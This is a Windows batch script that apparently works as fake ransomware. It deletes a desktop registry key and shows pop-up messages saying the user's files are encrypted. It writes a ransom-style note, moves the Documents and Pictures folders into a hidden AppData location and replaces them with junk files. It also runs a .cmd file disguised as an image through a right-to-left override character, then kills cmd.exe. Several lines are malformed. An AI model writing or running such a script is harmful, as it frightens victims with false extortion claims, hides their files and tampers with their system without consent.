@echo off
reg del "HKEY_CURRENT_USER\Control Panel\Desktop"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "shell:startup\WORK_DATA.jpg  /f RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
msg *  your files are encyipted !
msg * Read the " Read This " folder on your Desktop
start 
cd %UserProfile%\Desktop
echo All your files are now encrypted and you can get it back by pressing the win + r keys and write "MyFiles!.cmd " > READTHIS.txt
move %UserProfile%\Documents %UserProfile%\Appdata\Roaming\Microsoft\Windows
start 
cd %UserProfile%
mkdir Documents
start
cd %UserProfile%\Documents
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file1.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡" > file2.txt
echo "1234567890!@#$%^&*()_+[]{}|;:',.<>?/~`" > file3.xlsx
echo "¬±§¶•ªº–≠“”‘’≡¥@#%&*()_+" > file4.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file5.xlsx
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file6.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file7.txt
echo "1234567890!@#$%^&*()_+[]{}|;:',.<>?/~`" > file8.xlsx
echo "¬±§¶•ªº–≠“”‘’≡¥@#%&*()_+" > file9.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file10.xlsx
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file11.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file12.txt
echo "1234567890!@#$%^&*()_+[]{}|;:',.<>?/~`" > file13.xlsx
echo "¬±§¶•ªº–≠“”‘’≡¥@#%&*()_+" > file14.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file15.xlsx
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file16.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file17.txt
echo "1234567890!@#$%^&*()_+[]{}|;:',.<>?/~`" > file18.xlsx
echo "¬±§¶•ªº–≠“”‘’≡¥@#%&*()_+" > file19.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file20.xlsx
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file21.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file22.txt
echo "1234567890!@#$%^&*()_+[]{}|;:',.<>?/~`" > file23.xlsx
echo "¬±§¶•ªº–≠“”‘’≡¥@#%&*()_+" > file24.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file25.xlsx
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file26.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file27.txt
echo "1234567890!@#$%^&*()_+[]{}|;:',.<>?/~`" > file28.xlsx
echo "¬±§¶•ªº–≠“”‘’≡¥@#%&*()_+" > file29.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file30.xlsx
echo "¥@#%&*()_+|~`!^:;<>?[]{}" > file31.txt
echo "©®™£¢∞§¶•ªº–≠“”‘’≡1234567890" > file32.txt
move %UserProfile%Pictures %UserProfile%\Appdata\Roaming\Microsoft\Windows
start 
cd %UserProfile%\Pictures
mkdir Pictures
echo "(random data 1)" > 3f5a9c1e.jpg
echo "(random data 2)" > 7b2d4e8f.png
echo "(random data 3)" > 1a2b3c4d.gif
echo "(random data 4)" > 9e8f7d6c.bmp
echo "(random data 5)" > 4c3b2a1e.tiff
echo "(random data 6)" > 5d6e7f8g.jpeg
echo "(random data 7)" > 2a3b4c5d.webp
echo "(random data 8)" > 8f9e0d1c.png
echo "(random data 9)" > 6b5a4c3e.jpg
echo "(random data 10)" > 0d1e2f3a.gif
echo "(random data 11)" > 3c2b1a4e.bmp
echo "(random data 12)" > 7e8f9d0c.tiff
echo "(random data 13)" > 1f2e3d4c.jpeg
echo "(random data 14)" > 4a5b6c7d.webp
echo "(random data 15)" > 9c8b7a6e.png
echo "(random data 16)" > 2d3e4f5g.jpg
echo "(random data 17)" > 5e6f7a8b.gif
echo "(random data 18)" > 8a9b0c1d.bmp
echo "(random data 19)" > 3f4e5d6c.tiff
echo "(random data 20)" > 1b2c3d4e.jpeg
echo "(random data 21)" > 7d8e9f0a.webp
echo "(random data 22)" > 4c5b6a7e.png
echo "(random data 23)" > 0e1f2d3c.jpg
echo "(random data 24)" > 6a7b8c9d.gif
echo "(random data 25)" > 2f3e4d5c.bmp
echo "(random data 26)" > 8d9e0f1a.tiff
echo "(random data 27)" > 5c6b7a8e.jpeg
echo "(random data 28)" > 1e2f3d4b.webp
echo "(random data 29)" > 3a4b5c6d.png
echo "(random data 30)" > 9f8e7d6c.jpg
echo "(random data 31)" > 4d5e6f7a.gif
start
echo "(random data 32)" > 2b3c4d5e.bmp
echo "(random data 33)" > 7a8b9c0d.tiff
echo "(random data 34)" > 1c2d3e4f.jpeg
echo "(random data 35)" > 5e6f7a8b.webp
echo "(random data 36)" > 0d1e2f3c.png
echo "(random data 37)" > 6b5a4c3e.jpg
echo "(random data 38)" > 3f4e5d6c.gif
echo "(random data 39)" > 8a9b0c1d.bmp
echo "(random data 40)" > 2e3f4d5a.tiff
echo "(random data 41)" > 1b2c3d4e.jpeg
echo "(random data 42)" > 7d8e9f0a.webp
echo "(random data 43)" > 4c5b6a7e.png
echo "(random data 44)" > 0e1f2d3c.jpg
echo "(random data 45)" > 6a7b8c9d.gif
echo "(random data 46)" > 2f3e4d5c.bmp
echo "(random data 47)" > 8d9e0f1a.tiff
echo "(random data 48)" > 5c6b7a8e.jpeg
echo "(random data 49)" > 1e2f3d4b.webp
echo "(random data 50)" > 3a4b5c6d.png
echo "(random data 51)" > 9f8e7d6c.jpg
echo "(random data 52)" > 4d5e6f7a.gif
echo "(random data 53)" > 5c46eio7t7.png
echo "del shell:startup\RansomFake.cmd" > 592e82‮.gpj.cmd
"592e82‮.gpj.cmd"
taskkill /f /im "cmd.exe"


